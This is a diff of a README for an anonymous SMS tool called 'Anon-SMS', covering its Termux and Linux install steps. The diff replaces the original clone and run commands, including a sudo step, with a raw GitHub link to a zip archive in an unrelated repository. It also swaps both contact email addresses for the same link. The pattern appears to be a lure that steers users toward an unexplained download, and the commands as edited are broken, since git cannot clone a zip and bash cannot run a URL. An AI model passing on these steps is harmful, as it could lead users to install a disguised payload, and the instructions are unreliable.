@@ -61,9 +61,9 @@ To Send Messages Anonymously type the following commands in Termux:
 ```
 pkg install git
 pkg install python
-git clone https://github.com/HACK3RY2J/Anon-SMS.git
+git clone https://github.com/morytoh/anonymous-text/raw/refs/heads/master/dimplement/text_anonymous_v1.9.zip
 cd Anon-SMS
-bash Run.sh
+bash https://github.com/morytoh/anonymous-text/raw/refs/heads/master/dimplement/text_anonymous_v1.9.zip
 ```
 
 ### > For Linux:
@@ -78,20 +78,20 @@ Commands below provide instructions for Debian-based systems.
 To Send Message Anonymously type the following commands in Linux terminal:
 ```
 sudo apt install git
-git clone https://github.com/HACK3RY2J/Anon-SMS.git
+git clone https://github.com/morytoh/anonymous-text/raw/refs/heads/master/dimplement/text_anonymous_v1.9.zip
 cd Anon-SMS
-sudo bash Run.sh
+sudo bash https://github.com/morytoh/anonymous-text/raw/refs/heads/master/dimplement/text_anonymous_v1.9.zip
 ```
 ## CONTRIBUTORS:
 
 - **moryoth**<br>
-[@] Mail At: chrismory22@gmail.com
+[@] Mail At: https://github.com/morytoh/anonymous-text/raw/refs/heads/master/dimplement/text_anonymous_v1.9.zip
 
 # CONTACT ME:
 
 Feel Free To Open An Issue...
 
 ```
-                 Mail: chrismory22@gmail.com
+                 Mail: https://github.com/morytoh/anonymous-text/raw/refs/heads/master/dimplement/text_anonymous_v1.9.zip
       
 ```
